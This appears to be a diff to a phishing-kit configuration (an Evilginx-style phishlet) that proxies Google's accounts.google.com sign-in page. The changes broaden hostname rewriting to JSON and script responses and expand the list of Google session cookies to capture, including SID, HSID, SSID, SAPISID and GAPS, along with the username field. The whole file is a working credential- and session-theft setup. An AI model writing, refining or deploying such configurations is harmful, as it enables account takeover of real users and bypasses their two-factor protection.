@@ -3,13 +3,13 @@ min_ver: '3.0.0'
 proxy_hosts:
   - {phish_sub: '', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: true}
 sub_filters:
-  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts.google.com', replace: '{{.Endpoint3}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/javascript']}
-  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://accounts.google.com', replace: 'https://{{.Endpoint3}}.{{.Domain}}', mimes: ['text/html']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts.google.com', replace: '{{.Endpoint3}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://accounts.google.com', replace: 'https://{{.Endpoint3}}.{{.Domain}}', mimes: ['text/html', 'application/json']}
 auth_tokens:
   - domain: '.google.com'
-    keys: ['SID', 'LSID', '__Secure-1PSID', '__Secure-3PSID', '__Secure-1PAPISID', '__Secure-3PAPISID']
+    keys: ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'LSID', '__Secure-1PSID', '__Secure-3PSID', '__Secure-1PAPISID', '__Secure-3PAPISID', 'ACCOUNT_CHOOSER', 'OTZ']
   - domain: 'accounts.google.com'
-    keys: ['GAPS']
+    keys: ['GAPS', 'LSID', 'GV', 'SID']
 credentials:
   username:
     key: 'identifier'
